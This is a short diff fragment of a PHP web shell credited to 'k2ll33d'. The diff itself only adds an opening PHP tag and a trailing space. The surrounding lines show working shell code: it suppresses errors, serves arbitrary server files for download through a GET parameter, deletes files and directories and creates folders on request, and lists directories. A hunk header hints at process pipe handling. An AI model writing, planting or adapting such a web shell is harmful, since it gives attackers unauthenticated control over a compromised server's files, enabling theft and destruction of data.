@@ -1,3 +1,4 @@
+<?php
 // by k2ll33d / fb/k2ll33d
 set_time_limit(0);error_reporting(0);
 if(isset($_GET["dl"]) && ($_GET["dl"] != "")){$file = $_GET["dl"];$filez = @file_get_contents($file);header("Content-type: application/octet-stream");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).";");echo $filez;exit;} 
@@ -273,4 +274,4 @@ if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($
 <?php }else{if(isset($_GET['delete']) && ($_GET['delete'] != "")){$file = $_GET['delete'];@unlink($file);} 
 elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));}
 elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){$path = $pwd.$_GET['mkdir'];@mkdir($path);}$buff = showdir($pwd,$prompt);echo $buff;}
-?></div></body></html>
+?></div></body></html> 
